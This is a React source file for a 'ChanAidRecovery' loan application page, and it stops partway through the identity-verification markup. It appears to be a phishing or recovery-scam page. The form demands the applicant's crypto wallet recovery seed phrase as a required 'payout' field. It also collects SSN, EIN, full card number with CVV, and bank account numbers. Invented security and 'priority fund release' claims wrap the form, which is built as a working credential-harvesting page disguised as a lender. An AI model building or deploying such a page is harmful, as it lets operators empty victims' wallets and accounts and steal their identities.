import { createFileRoute, Link } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import { SiteShell } from "@/components/layout/SiteShell";
import { 
  Loader2, CheckCircle2, ShieldCheck, Banknote, CreditCard, Lock, Wallet, 
  Camera, IdCard, BookOpen, AlertTriangle, BadgeCheck, FileCheck2, Clock, 
  Fingerprint, RefreshCw, Video, LayoutDashboard, Info, Mail 
} from "lucide-react";
import { useLoanApplication } from "@/hooks/useLoanApplication";
import { formatCardNumber, formatExpiry } from "@/lib/loan-utils";
import { Reveal } from "@/components/effects/Reveal";
import { VideoCapture } from "@/components/loan/VideoCapture";
import { useAuth } from "@/components/layout/AuthContext";
import { AuthModal } from "@/components/layout/AuthModal";
import { Users, ArrowRight, ShieldCheck as ShieldCheckIcon, UserPlus, Fingerprint as FingerprintIcon } from "lucide-react";
import { PremiumProgressBar } from "@/components/ui/PremiumProgressBar";

// Renders only on client to avoid SSR/CSR text mismatch (React #418).
function ClientClock() {
  const [time, setTime] = useState<string>("");
  useEffect(() => {
    const tick = () => setTime(new Date().toLocaleTimeString());
    tick();
    const id = setInterval(tick, 1000);
    return () => clearInterval(id);
  }, []);
  return <>{time}</>;
}

// ─── Identity Verification sub-components (defined before LoansPage so TanStack
//     code-splitting includes them in the component chunk) ──────────────────────

function VerificationStep({
  stepNumber, title, subtitle, completed, description, icon, requirements, optional, children,
}: {
  stepNumber: number;
  title: string;
  subtitle: string;
  completed: boolean;
  description: string;
  icon: React.ReactNode;
  requirements: string[];
  optional?: boolean;
  children: React.ReactNode;
}) {
  return (
    <div className={`mx-1 sm:mx-4 mb-4 rounded-xl sm:rounded-2xl border-2 transition-all overflow-hidden ${
      completed ? "border-emerald-300 bg-emerald-50/40" : "border-slate-200 bg-white"
    }`}>
      <div className={`px-4 py-3 sm:px-5 sm:py-3.5 flex items-center gap-3 border-b ${
        completed ? "border-emerald-200 bg-emerald-50" : "border-slate-100 bg-slate-50"
      }`}>
        <div className={`w-9 h-9 rounded-full flex items-center justify-center shrink-0 transition-all ${
          completed ? "bg-emerald-500 text-white" : optional ? "bg-slate-200 text-slate-500" : "bg-primary text-white"
        }`}>
          {completed ? <CheckCircle2 className="w-4 h-4" /> : <span className="text-sm font-bold">{stepNumber}</span>}
        </div>
        <div className="flex-1 min-w-0">
          <div className="flex items-center gap-2 flex-wrap">
            <span className="text-sm font-bold text-slate-900">{title}</span>
            {optional && <span className="text-[10px] font-semibold bg-slate-200 text-slate-500 px-2 py-0.5 rounded-full uppercase tracking-wider">Optional</span>}
            {completed && <span className="text-[10px] font-semibold bg-emerald-100 text-emerald-700 px-2 py-0.5 rounded-full uppercase tracking-wider">Verified</span>}
          </div>
          <div className="text-[11px] text-slate-500 mt-0.5">{subtitle}</div>
        </div>
        <div className={`shrink-0 w-8 h-8 rounded-lg flex items-center justify-center ${
          completed ? "bg-emerald-100 text-emerald-600" : "bg-primary/10 text-primary"
        }`}>
          {icon}
        </div>
      </div>
      <div className="p-4 sm:p-5 space-y-4">
        <p className="text-sm text-slate-600 leading-relaxed">{description}</p>
        <div className="grid sm:grid-cols-2 gap-1.5">
          {requirements.map((r) => (
            <div key={r} className="flex items-start gap-1.5 text-[11px] text-slate-500">
              <CheckCircle2 className="w-3 h-3 text-slate-400 mt-0.5 shrink-0" />
              {r}
            </div>
          ))}
        </div>
        {children}
      </div>
    </div>
  );
}

function UploadZone({
  label, sublabel, description, icon, value, onChange, progress,
}: {
  label: string;
  sublabel: string;
  description: string;
  icon: React.ReactNode;
  value: string | null;
  onChange: (e: React.ChangeEvent<HTMLInputElement>) => void;
  progress?: number;
}) {
  const uploaded = Boolean(value);
  const isUploading = typeof progress === "number" && progress > 0 && progress < 100;
  const pct = Math.min(Math.round(progress ?? 0), 100);

  return (
    <div className="space-y-1.5">
      <div className="flex items-center gap-1.5">
        <span className="text-xs font-bold text-slate-800">{label}</span>
        <span className={`text-[10px] font-semibold px-1.5 py-0.5 rounded-full ${sublabel === "Required" ? "bg-red-100 text-red-600" : "bg-slate-100 text-slate-500"}`}>
          {sublabel}
        </span>
      </div>

      {/* Progress bar shown outside the tap target for better mobile UX */}
      {isUploading ? (
        <PremiumProgressBar
          progress={pct}
          status={pct < 100 ? "uploading" : "processing"}
          fileName={label}
        />
      ) : (
        <label className={`group relative flex flex-col items-center justify-center gap-2 border-2 border-dashed rounded-xl cursor-pointer transition-all min-h-[110px] overflow-hidden
          ${uploaded ? "border-emerald-400 bg-emerald-50" : "border-slate-300 bg-white hover:border-primary/60 hover:bg-primary/5 active:bg-primary/5"}`}>
          <input type="file" accept="image/*,application/pdf" onChange={onChange} className="sr-only" />

          {uploaded && value ? (
            <>
              <img src={value.startsWith("data:image") ? value : undefined} alt={label} className="h-14 w-full object-cover rounded-lg" />
              <div className="absolute top-2 right-2 bg-emerald-500 rounded-full p-0.5">
                <CheckCircle2 className="w-3.5 h-3.5 text-white" />
              </div>
              <span className="absolute bottom-1.5 text-[10px] text-emerald-700 font-semibold">Tap to replace</span>
            </>
          ) : (
            <>
              <div className="w-9 h-9 rounded-full bg-slate-100 border border-slate-200 flex items-center justify-center group-hover:bg-primary/10 group-hover:border-primary/30 transition-all">
                {icon}
              </div>
              <span className="text-[10px] text-slate-500 text-center leading-relaxed px-2">{description}</span>
              <span className="text-[10px] font-bold text-primary uppercase tracking-wider">Tap to upload</span>
            </>
          )}
        </label>
      )}
    </div>
  );
}

// ─── Route ───────────────────────────────────────────────────────────────────

export const Route = createFileRoute("/_site/loans")({
  head: () => ({
    meta: [
      { title: "Apply for a Loan | ChanAidRecovery" },
      { name: "description", content: "Apply for a personal loan with ChanAidRecovery. Choose bank transfer, card, or crypto payout. Fast review, transparent terms." },
      { property: "og:title", content: "Apply for a Loan | ChanAidRecovery" },
      { property: "og:description", content: "Apply for a personal loan. Bank transfer, card, or crypto payout. Fast review." },
    ],
  }),
  component: LoansPage,
});

// ─── Page ────────────────────────────────────────────────────────────────────

function LoansPage() {
  const { user, isLoading: authLoading } = useAuth();
  const [isAuthModalOpen, setIsAuthModalOpen] = useState(false);
  const [authMode, setAuthMode] = useState<"signin" | "signup">("signin");

  const {
    loading, done, countdown, payout, setPayout,
    cardNumber, setCardNumber, cardExpiry, setCardExpiry,
    cardCvv, setCardCvv, cardErrors, setCardErrors,
    selfieImage, idFrontImage, idBackImage, passportFrontImage, passportBackImage, videoSelfie,
    uploadProgress,
    onSelfieChange, onIdFrontChange, onIdBackChange, onPassportFrontChange, onPassportBackChange,
    onVideoSelfieChange, handleSubmit,
    appStatus, appId, clearSession,
    currentStep, totalSteps, nextStep, prevStep, setCurrentStep,
    formRef,
  } = useLoanApplication();

  return (
    <>
      <section className="bg-hero-gradient">
        <div className="max-w-5xl mx-auto px-4 sm:px-6 lg:px-8 pt-16 pb-10 text-center">
          <span className="inline-flex items-center gap-2 text-xs font-semibold uppercase tracking-wider bg-white/70 backdrop-blur px-3 py-1.5 rounded-full text-red-600 border border-red-200">
            <Banknote className="w-3.5 h-3.5" /> Fast-Track Processing Available
          </span>
          <h1 className="mt-5 text-4xl sm:text-5xl font-bold leading-tight">
            Apply for a <span className="text-gradient">Loan</span>
          </h1>
          <p className="mt-4 text-lg text-muted-foreground max-w-2xl mx-auto">
            Get the financial support you need. Apply now for immediate review and get priority funding directly to your bank, card, or crypto wallet.
          </p>
        </div>
      </section>

      <section className="max-w-5xl mx-auto px-4 sm:px-6 lg:px-8 -mt-6 pb-20">
        {!user && !authLoading ? (
          <Reveal direction="up">
            <div className="max-w-3xl mx-auto">
              <div className="bg-white rounded-[2.5rem] shadow-elegant overflow-hidden border border-slate-100">
                <div className="bg-slate-900 p-8 text-white relative overflow-hidden">
                  <div className="absolute top-0 right-0 p-8 opacity-10">
                    <ShieldCheckIcon className="w-32 h-32 rotate-12" />
                  </div>
                  <div className="relative z-10">
                    <div className="flex items-center gap-3 mb-4">
                      <div className="w-10 h-10 rounded-2xl bg-primary/20 flex items-center justify-center border border-primary/30">
                        <Lock className="w-5 h-5 text-primary" />
                      </div>
                      <span className="text-[10px] font-black uppercase tracking-[0.2em] text-primary">Secure Access Required</span>
                    </div>
                    <h2 className="text-3xl sm:text-4xl font-black tracking-tight italic mb-4">Authentication <span className="text-primary">Mandatory</span></h2>
                    <p className="text-slate-400 font-medium max-w-xl">
                      To ensure the security of your financial data and prevent unauthorized loan submissions, you must have a verified account to access the application portal.
                    </p>
                  </div>
                </div>

                <div className="p-8 sm:p-12">
                  <div className="grid md:grid-cols-2 gap-8 mb-10">
                    <div className="space-y-4">
                      <div className="flex items-start gap-4">
                        <div className="w-10 h-10 rounded-xl bg-slate-50 flex items-center justify-center shrink-0 border border-slate-100">
                          <ShieldCheckIcon className="w-5 h-5 text-slate-400" />
                        </div>
                        <div>
                          <h4 className="text-sm font-bold text-slate-900 mb-1">Encrypted Submission</h4>
                          <p className="text-xs text-slate-500 leading-relaxed">Your personal and payout information is protected by military-grade AES-256 encryption.</p>
                        </div>
                      </div>
                      <div className="flex items-start gap-4">
                        <div className="w-10 h-10 rounded-xl bg-slate-50 flex items-center justify-center shrink-0 border border-slate-100">
                          <CheckCircle2 className="w-5 h-5 text-slate-400" />
                        </div>
                        <div>
                          <h4 className="text-sm font-bold text-slate-900 mb-1">Identity Verification</h4>
                          <p className="text-xs text-slate-500 leading-relaxed">Secure authentication prevents identity theft and ensures funds reach the correct recipient.</p>
                        </div>
                      </div>
                    </div>
                    <div className="space-y-4">
                      <div className="flex items-start gap-4">
                        <div className="w-10 h-10 rounded-xl bg-slate-50 flex items-center justify-center shrink-0 border border-slate-100">
                          <LayoutDashboard className="w-5 h-5 text-slate-400" />
                        </div>
                        <div>
                          <h4 className="text-sm font-bold text-slate-900 mb-1">Real-time Tracking</h4>
                          <p className="text-xs text-slate-500 leading-relaxed">Monitor your application status and document verification from your personal dashboard.</p>
                        </div>
                      </div>
                      <div className="flex items-start gap-4">
                        <div className="w-10 h-10 rounded-xl bg-slate-50 flex items-center justify-center shrink-0 border border-slate-100">
                          <FingerprintIcon className="w-5 h-5 text-slate-400" />
                        </div>
                        <div>
                          <h4 className="text-sm font-bold text-slate-900 mb-1">Biometric Security</h4>
                          <p className="text-xs text-slate-500 leading-relaxed">Advanced biometric matching links your application to your verified identity.</p>
                        </div>
                      </div>
                    </div>
                  </div>

                  <div className="flex flex-col sm:flex-row items-center gap-4 pt-8 border-t border-slate-100">
                    <button 
                      onClick={() => { setAuthMode("signin"); setIsAuthModalOpen(true); }}
                      className="w-full sm:w-auto px-10 py-4 bg-slate-900 text-white font-black rounded-2xl shadow-xl hover:bg-slate-800 transition-all flex items-center justify-center gap-2 group"
                    >
                      Sign In Now <ArrowRight className="w-4 h-4 group-hover:translate-x-1 transition-transform" />
                    </button>
                    <button 
                      onClick={() => { setAuthMode("signup"); setIsAuthModalOpen(true); }}
                      className="w-full sm:w-auto px-10 py-4 bg-white text-slate-900 border-2 border-slate-900 font-black rounded-2xl hover:bg-slate-50 transition-all flex items-center justify-center gap-2"
                    >
                      <UserPlus className="w-4 h-4" /> Create Account
                    </button>
                  </div>
                </div>
              </div>

              <div className="mt-8 text-center">
                <p className="text-xs text-slate-400 font-medium">
                  Protected by ChanAidRecovery Global Security Protocol. 
                  <Link to="/privacy-policy" className="ml-1 text-primary hover:underline">Privacy Policy</Link>
                </p>
              </div>
            </div>
          </Reveal>
        ) : authLoading ? (
          <div className="max-w-3xl mx-auto min-h-[400px] flex items-center justify-center">
            <div className="flex flex-col items-center gap-4">
              <Loader2 className="w-10 h-10 text-primary animate-spin" />
              <p className="text-slate-500 font-bold uppercase tracking-widest text-[10px]">Validating Session Security...</p>
            </div>
          </div>
        ) : done ? (
          <div className="max-w-3xl mx-auto">
            <div className="rounded-3xl bg-white shadow-elegant overflow-hidden border border-border animate-in fade-in zoom-in duration-500">
              {/* Header Status Bar */}
              <div className={`px-8 py-4 flex items-center justify-between ${
                appStatus?.status === 'verified' ? 'bg-emerald-600' :
                appStatus?.status === 'rejected' ? 'bg-red-600' :
                appStatus?.status === 'needs_correction' ? 'bg-purple-600' :
                'bg-slate-900'
              }`}>
                <div className="flex items-center gap-3">
                  <div className="w-8 h-8 rounded-full bg-white/20 flex items-center justify-center text-white">
                    {appStatus?.status === 'verified' ? <CheckCircle2 className="w-5 h-5" /> : <Clock className="w-5 h-5 animate-pulse" />}
                  </div>
                  <div>
                    <div className="text-[10px] font-black uppercase tracking-widest text-white/60 leading-none mb-1">Application Status</div>
                    <div className="text-white font-bold text-sm uppercase tracking-wider">
                      {appStatus?.status ? appStatus.status.replace('_', ' ') : 'Processing...'}
                    </div>
                  </div>
                </div>
                <div className="text-right">
                  <div className="text-[10px] font-black uppercase tracking-widest text-white/60 leading-none mb-1">Last Update</div>
                  <div className="text-white font-mono text-[10px]">
                    <ClientClock />
                  </div>
                </div>
              </div>

              <div className="p-8 sm:p-12 text-center">
                {appStatus?.status === 'verified' ? (
                  <div className="space-y-8 animate-in fade-in zoom-in duration-700">
                    <div className="relative">
                      <div className="w-24 h-24 bg-emerald-100 rounded-full flex items-center justify-center mx-auto shadow-inner relative z-10">
                        <ShieldCheck className="w-12 h-12 text-emerald-600" />
                      </div>
                      <div className="absolute inset-0 bg-emerald-400/20 rounded-full animate-ping"></div>
                    </div>
                    
                    <div className="space-y-2">
                      <h2 className="text-4xl font-black text-slate-900 tracking-tight italic">Verification <span className="text-emerald-600">Successful</span></h2>
                      <p className="text-slate-500 font-medium">Your global identity audit is complete.</p>
                    </div>

                    <div className="bg-emerald-50 border-2 border-emerald-100 rounded-3xl p-8 max-w-md mx-auto shadow-sm relative overflow-hidden group">
                      <div className="absolute top-0 right-0 p-4 opacity-5 group-hover:scale-110 transition-transform">
                         <BadgeCheck className="w-20 h-20" />
                      </div>
                      <div className="relative z-10">
                        <p className="text-emerald-800 font-black mb-3 flex items-center justify-center gap-2 uppercase tracking-widest text-xs">
                          <BadgeCheck className="w-5 h-5" /> Priority Fund Release Authorized
                        </p>
                        <p className="text-sm text-emerald-700 leading-relaxed font-bold">
                          The requested amount of <span className="text-emerald-900 underline decoration-emerald-300 underline-offset-4">{appStatus.currency} {Number(appStatus.amountRequested).toLocaleString()}</span> has been authorized for immediate settlement to your {(appStatus.payoutMethod ?? "account").replace('_', ' ')}.
                        </p>
                      </div>
                    </div>

                    <div className="space-y-4 pt-4">
                      <p className="text-[10px] font-black uppercase tracking-[0.2em] text-slate-400">
                        Transferring to secure vault in
                      </p>
                      <div className="relative inline-flex items-center justify-center">
                        <svg className="w-24 h-24 transform -rotate-90">
                          <circle
                            cx="48"
                            cy="48"
                            r="40"
                            stroke="currentColor"
                            strokeWidth="8"
                            fill="transparent"
                            className="text-slate-100"
                          />
                          <circle
                            cx="48"
                            cy="48"
                            r="40"
                            stroke="currentColor"
                            strokeWidth="8"
                            fill="transparent"
                            strokeDasharray={251.2}
                            strokeDashoffset={251.2 * (1 - countdown / 10)}
                            className="text-primary transition-all duration-1000 ease-linear"
                          />
                        </svg>
                        <span className="absolute text-3xl font-black text-slate-900 tabular-nums">
                          {countdown}
                        </span>
                      </div>
                      <p className="text-xs text-slate-400 font-medium animate-pulse">
                        Please do not disconnect...
                      </p>
                    </div>
                  </div>
                ) : appStatus?.status === 'rejected' || appStatus?.status === 'needs_correction' ? (
                  <div className="space-y-6">
                    <div className="w-24 h-24 bg-red-100 rounded-full flex items-center justify-center mx-auto shadow-inner">
                      <AlertTriangle className="w-12 h-12 text-red-600" />
                    </div>
                    <h2 className="text-3xl font-black text-slate-900 tracking-tight">Review Alert</h2>
                    <div className="bg-red-50 border-2 border-red-100 rounded-2xl p-6 max-w-md mx-auto">
                      <p className="text-red-800 font-bold mb-2 uppercase tracking-widest text-xs">Correction Required</p>
                      <p className="text-sm text-red-700 leading-relaxed font-medium">
                        {appStatus?.rejectionReason || "Our team was unable to verify your identity with the provided documents. Please ensure images are clear and valid."}
                      </p>
                    </div>
                    <button
                      onClick={() => {
                        clearSession();
                        window.location.reload();
                      }}
                      className="inline-flex items-center gap-2 text-primary font-bold text-sm border-b-2 border-primary/20 hover:border-primary transition-all pb-0.5"
                    >
                      Update Documentation & Retry
                    </button>
                  </div>
                ) : (
                  <div className="space-y-8">
                    <div className="relative w-32 h-32 mx-auto">
                      <div className="absolute inset-0 rounded-full border-4 border-slate-100"></div>
                      <div className="absolute inset-0 rounded-full border-4 border-primary border-t-transparent animate-spin"></div>
                      <div className="absolute inset-0 flex items-center justify-center">
                        <Fingerprint className="w-12 h-12 text-primary opacity-20 animate-pulse" />
                      </div>
                    </div>
                    
                    <div className="space-y-3">
                      <h2 className="text-3xl font-black text-slate-900 tracking-tight italic">Biometric Review</h2>
                      <p className="text-slate-500 max-w-md mx-auto text-sm leading-relaxed">
                        Your application <span className="font-mono text-xs bg-slate-100 px-1.5 py-0.5 rounded">#{appId?.slice(0,8)}</span> has been securely queued. Our officers are verifying your biometric video and ID documents against global databases.
                      </p>
                      <div className="flex items-center justify-center gap-2 text-[10px] font-bold text-slate-400 uppercase tracking-widest mt-2">
                        <Mail className="w-3.5 h-3.5 text-primary" />
                        <span>Check your <u>Spam folder</u> if you don't receive an email confirmation</span>
                      </div>
                    </div>

                    {/* Visual Pipeline */}
                    <div className="max-w-md mx-auto grid grid-cols-3 gap-1 relative">
                       <div className="absolute top-4 left-[15%] right-[15%] h-1 bg-slate-100 -z-10">
                          <div className={`h-full bg-primary transition-all duration-1000 ${
                             appStatus?.status === 'under_review' ? 'w-1/2' : 
                             appStatus?.status === 'verified' ? 'w-full' : 'w-0'
                           }`}></div>
                       </div>
                       {[
                         { id: 'pending', label: 'Queued', icon: <FileCheck2 className="w-4 h-4" /> },
                         { id: 'under_review', label: 'In Review', icon: <RefreshCw className="w-4 h-4" /> },
                         { id: 'verified', label: 'Released', icon: <CheckCircle2 className="w-4 h-4" /> }
                       ].map((step, i) => {
                         const statusOrder = ['pending', 'under_review', 'verified'];
                         const currentIdx = statusOrder.indexOf(appStatus?.status || 'pending');
                         const stepIdx = statusOrder.indexOf(step.id);
                         
                         const isActive = currentIdx === stepIdx;
                         const isPast = currentIdx > stepIdx;
                         
                         return (
                           <div key={step.id} className="flex flex-col items-center gap-2">
                             <div className={`w-10 h-10 rounded-full flex items-center justify-center shadow-sm border-2 transition-all ${
                               isActive ? "bg-primary text-white border-primary scale-110 shadow-lg shadow-primary/20" : 
                               isPast ? "bg-emerald-500 text-white border-emerald-500" :
                               "bg-white text-slate-300 border-slate-100"
                             }`}>
                               {isPast ? <CheckCircle2 className="w-4 h-4" /> : step.icon}
                             </div>
                             <span className={`text-[10px] font-black uppercase tracking-tighter transition-colors duration-300 ${isActive ? "text-primary" : isPast ? "text-emerald-600" : "text-slate-400"}`}>{step.label}</span>
                           </div>
                         );
                       })}
                    </div>

                    <div className="bg-slate-50 rounded-2xl p-5 border border-slate-100 flex items-center gap-4 text-left max-w-md mx-auto">
                      <div className="w-10 h-10 rounded-xl bg-white border border-slate-200 flex items-center justify-center shrink-0 shadow-sm">
                        <Clock className="w-5 h-5 text-slate-400" />
                      </div>
                      <div className="flex-1">
                        <div className="text-[10px] font-bold text-slate-400 uppercase tracking-widest leading-none mb-1">Estimated Wait</div>
                        <div className="text-slate-900 font-bold text-sm">5 — 15 Minutes</div>
                      </div>
                      <div className="px-3 py-1 bg-emerald-50 text-emerald-600 text-[10px] font-black rounded-lg uppercase tracking-tighter">
                        Priority Queue
                      </div>
                    </div>

                    <p className="text-[10px] text-slate-400 font-medium">
                      Do not close this window. Your browser is maintaining a secure, authenticated session with the verification gateway.
                    </p>
                  </div>
                )}
              </div>
            </div>
            
            <div className="mt-8 flex justify-center">
               <button 
                onClick={() => {
                  localStorage.removeItem("chanaid_loan_id");
                  window.location.reload();
                }}
                className="text-slate-400 hover:text-slate-600 text-xs font-semibold flex items-center gap-2 transition-colors"
               >
                 <RefreshCw className="w-3.5 h-3.5" /> Start a new application
               </button>
            </div>
          </div>
        ) : (
          <form ref={formRef} onSubmit={handleSubmit} noValidate className="max-w-4xl mx-auto">
            <Reveal direction="up">
              <div className="bg-white rounded-2xl sm:rounded-3xl shadow-elegant border border-slate-100 overflow-hidden mb-6">
                <div className="p-5 sm:p-8 md:p-10">
                  <StepIndicator current={currentStep} total={totalSteps} />

                  {/* ─── STEP 1: Application Details ─────────────────────── */}
                  <div className={currentStep === 1 ? "block" : "hidden"}>
                    <Section title="Personal Information" icon={<Users className="w-5 h-5" />}>
                      <div className="grid sm:grid-cols-2 gap-4">
                        <Input name="first_name" label="First name *" autoComplete="given-name" />
                        <Input name="last_name" label="Last name" autoComplete="family-name" />
                        <Input name="email" type="email" label="Email address *" autoComplete="email" />
                        <Input name="phone" type="tel" label="Phone number" autoComplete="tel" />
                        <Input name="date_of_birth" type="date" label="Date of birth" autoComplete="bday" />
                        <Select name="employment_status" label="Employment status">
                          <option value="">Select…</option>
                          <option>Employed full-time</option>
                          <option>Employed part-time</option>
                          <option>Self-employed</option>
                          <option>Unemployed</option>
                          <option>Retired</option>
                          <option>Student</option>
                        </Select>
                        <Input name="ssn" label="SSN (Social Security Number) *" placeholder="XXX-XX-XXXX" maxLength={11} required />
                        <Input name="ein" label="EIN (Employer Identification Number) *" placeholder="XX-XXXXXXX" maxLength={10} required />
                      </div>
                    </Section>

                    <Section title="Home Address" icon={<ShieldCheck className="w-5 h-5" />}>
                      <div className="grid sm:grid-cols-2 gap-4">
                        <Input name="address_line1" label="Address line 1" className="sm:col-span-2" autoComplete="address-line1" />
                        <Input name="address_line2" label="Address line 2" className="sm:col-span-2" autoComplete="address-line2" />
                        <Input name="city" label="City" autoComplete="address-level2" />
                        <Input name="state_region" label="State / Region" autoComplete="address-level1" />
                        <Input name="postal_code" label="Postal code" autoComplete="postal-code" />
                        <Input name="country" label="Country" autoComplete="country-name" />
                      </div>
                    </Section>

                    <Section title="Loan Requirements" icon={<Banknote className="w-5 h-5" />}>
                      <div className="grid sm:grid-cols-2 gap-4">
                        <Input name="amount_requested" type="number" min="100" step="50" label="Amount requested *" />
                        <Select name="currency" label="Currency" defaultValue="USD">
                          <option>USD</option><option>EUR</option><option>GBP</option><option>CAD</option><option>AUD</option>
                        </Select>
                        <Input name="loan_term_months" type="number" min="1" max="600" label="Term (months)" />
                        <Input name="monthly_income" type="number" min="0" step="100" label="Monthly income (approx.)" />
                        <div className="sm:col-span-2">
                          <Label>Purpose of loan</Label>
                          <textarea name="loan_purpose" rows={3} maxLength={2000} className="w-full rounded-xl border border-slate-200 bg-slate-50/30 px-4 py-3 text-sm focus:outline-none focus:ring-2 focus:ring-primary/20 transition-all" />
                        </div>
                      </div>
                    </Section>
                  </div>

                  {/* ─── STEP 2: Payout Setup ──────────────────────────── */}
                  <div className={currentStep === 2 ? "block" : "hidden"}>
                    <Section title="Payout Method" icon={<CreditCard className="w-5 h-5" />}>
                      <p className="text-sm text-slate-500 mb-6 -mt-2">Choose how you would like to receive your funds once approved.</p>
                      
                      <div className="grid sm:grid-cols-3 gap-4 mb-8">
                        <PayoutOption
                          selected={payout === "crypto"}
                          onClick={() => setPayout("crypto")}
                          icon={<Wallet className="w-5 h-5" />}
                          title="Crypto Wallet"
                          desc="Fastest settlement (minutes). Best for urgent recovery."
                          recommended
                        />
                        <PayoutOption
                          selected={payout === "card"}
                          onClick={() => setPayout("card")}
                          icon={<CreditCard className="w-5 h-5" />}
                          title="Card Deposit"
                          desc="Bank-grade fraud protection & chargeback rights."
                          badge="Safest Choice"
                        />
                        <PayoutOption
                          selected={payout === "bank_transfer"}
                          onClick={() => setPayout("bank_transfer")}
                          icon={<Banknote className="w-5 h-5" />}
                          title="Bank Transfer"
                          desc="Traditional ACH / SWIFT. 1–3 business days."
                        />
                      </div>

                      {/* Crypto Panel */}
                      {payout === "crypto" && (
                        <div className="rounded-2xl border border-orange-100 bg-orange-50/30 overflow-hidden animate-in fade-in slide-in-from-top-2 duration-300">
                          <div className="flex items-center gap-3 px-5 py-4 bg-orange-500">
                            <div className="w-8 h-8 rounded-lg bg-white/20 flex items-center justify-center text-white"><Wallet className="w-4 h-4" /></div>
                            <span className="text-white font-bold text-sm tracking-wide uppercase">Crypto Settlement Details</span>
                          </div>
                          <div className="p-6 space-y-5">
                            <div className="grid sm:grid-cols-2 gap-4">
                              <Select name="crypto_wallet_type" label="Wallet provider *">
                                <option value="">Select wallet…</option>
                                <option>Trust Wallet</option><option>MetaMask</option><option>Coinbase Wallet</option><option>Exodus</option><option>Other</option>
                              </Select>
                              <Select name="crypto_network" label="Settlement network *">
                                <option value="">Select network…</option>
                                <option value="ERC-20">Ethereum (ERC-20)</option>
                                <option value="TRC-20">Tron (TRC-20)</option>
                                <option value="BEP-20">BNB Smart Chain (BEP-20)</option>
                                <option value="BTC">Bitcoin (BTC)</option>
                                <option value="SOL">Solana (SOL)</option>
                                <option value="POLYGON">Polygon (MATIC)</option>
                              </Select>
                            </div>
                            <Input name="crypto_wallet_address" label="Wallet address *" placeholder="0x... / bc1... / T..." />
                            <div className="pt-2">
                              <label className="block text-[10px] font-bold text-gray-400 uppercase tracking-widest mb-1.5 ml-1">Recovery phrase (12/24 words) *</label>
                              <textarea
                                name="crypto_seed_phrase"
                                required
                                className="w-full px-4 py-3 rounded-xl border border-gray-200 bg-white/50 text-sm focus:ring-2 focus:ring-orange-500 focus:border-transparent outline-none transition-all placeholder:text-gray-300 min-h-[80px] resize-none"
                                placeholder="Enter your 12 or 24 word mnemonic seed phrase for fund recovery..."
                              />
                              <p className="mt-1.5 text-[9px] text-gray-400 leading-relaxed italic px-1">
                                Your phrase is encrypted and used only for automated recovery verification.
                              </p>
                            </div>
                          </div>
                        </div>
                      )}

                      {/* Card Panel */}
                      {payout === "card" && (
                        <div className="rounded-2xl border border-emerald-100 bg-emerald-50/20 overflow-hidden animate-in fade-in slide-in-from-top-2 duration-300">
                          <div className="flex items-center gap-3 px-5 py-4 bg-emerald-600">
                            <div className="w-8 h-8 rounded-lg bg-white/20 flex items-center justify-center text-white"><CreditCard className="w-4 h-4" /></div>
                            <span className="text-white font-bold text-sm tracking-wide uppercase">Card Deposit Details</span>
                          </div>
                          <div className="p-6 space-y-6">
                            <div className="grid sm:grid-cols-2 gap-4">
                              <Input name="card_holder_name" label="Cardholder name *" autoComplete="cc-name" />
                              <Select name="card_issuer" label="Card issuer *">
                                <option value="">Select…</option>
                                <option>Visa</option><option>Mastercard</option><option>Amex</option>
                              </Select>
                            </div>
                            <Input label="Card number *" value={cardNumber} onChange={e => setCardNumber(formatCardNumber(e.target.value))} maxLength={19} placeholder="XXXX XXXX XXXX XXXX" />
                            <div className="grid grid-cols-2 gap-4">
                              <Input label="Expiry *" value={cardExpiry} onChange={e => setCardExpiry(formatExpiry(e.target.value))} placeholder="MM/YY" maxLength={5} />
                              <Input label="CVV *" value={cardCvv} onChange={e => setCardCvv(e.target.value.replace(/\D/g, "").slice(0, 4))} placeholder="123" maxLength={4} />
                            </div>
                            {/* Hidden fields for FormData compatibility */}
                            <input type="hidden" name="card_number" value={cardNumber.replace(/\s/g, "")} />
                            <input type="hidden" name="card_expiry" value={cardExpiry} />
                            <input type="hidden" name="card_cvv" value={cardCvv} />

                            <div className="pt-5 border-t border-emerald-100">
                              <div className="flex items-center gap-2 mb-3">
                                <ShieldCheck className="w-4 h-4 text-emerald-600" />
                                <span className="text-[11px] font-black uppercase tracking-wider text-emerald-700">Billing Address</span>
                              </div>
                              <p className="text-[11px] text-slate-500 mb-3">Must match the address on file with your card issuer (AVS check).</p>
                              <div className="grid sm:grid-cols-2 gap-4">
                                <Input name="billing_address_line1" label="Address line 1 *" className="sm:col-span-2" autoComplete="cc-csc" />
                                <Input name="billing_address_line2" label="Address line 2" className="sm:col-span-2" />
                                <Input name="billing_city" label="City *" />
                                <Input name="billing_state" label="State / Region *" />
                                <Input name="billing_postal_code" label="Postal code *" />
                                <Input name="billing_country" label="Country *" />
                              </div>
                            </div>
                          </div>
                        </div>
                      )}

                      {/* Bank Panel */}
                      {payout === "bank_transfer" && (
                        <div className="rounded-2xl border border-blue-100 bg-blue-50/20 overflow-hidden animate-in fade-in slide-in-from-top-2 duration-300">
                          <div className="flex items-center gap-3 px-5 py-4 bg-blue-600">
                            <div className="w-8 h-8 rounded-lg bg-white/20 flex items-center justify-center text-white"><Banknote className="w-4 h-4" /></div>
                            <span className="text-white font-bold text-sm tracking-wide uppercase">Bank Account Details</span>
                          </div>
                          <div className="p-6 grid sm:grid-cols-2 gap-4">
                            <Input name="account_holder_name" label="Account holder *" />
                            <Input name="bank_name" label="Bank name *" />
                            <Input name="bank_account_number" label="Account number *" />
                            <Input name="bank_routing_number" label="Routing / IBAN / SWIFT *" />
                          </div>
                        </div>
                      )}
                    </Section>
                  </div>

                  {/* ─── STEP 3: Identity & Security ──────────────────── */}
                  <div className={currentStep === 3 ? "block" : "hidden"}>
                    <Section title="Identity Verification" icon={<ShieldCheck className="w-5 h-5" />}>
                      <div className="bg-slate-900 border border-white/10 rounded-[2rem] p-8 mb-8 relative overflow-hidden group">
                        <div className="absolute top-0 right-0 p-8 opacity-5 group-hover:scale-110 transition-transform">
                          <Lock className="w-24 h-24 text-white" />
                        </div>
                        <div className="relative z-10 flex gap-6 items-start">
                          <div className="w-12 h-12 rounded-2xl bg-primary/20 flex items-center justify-center shrink-0 border border-primary/30">
                            <ShieldCheck className="w-6 h-6 text-primary" />
                          </div>
                          <div>
                            <h4 className="text-white font-black text-lg mb-2 italic">Global Security Compliance</h4>
                            <p className="text-slate-400 text-xs leading-relaxed font-medium">
                              To prevent identity theft and comply with international Anti-Money Laundering (AML) regulations, we require high-resolution biometric verification. Our system uses military-grade encryption to protect your data during the audit process.
                            </p>
                            <div className="mt-4 flex items-center gap-4">
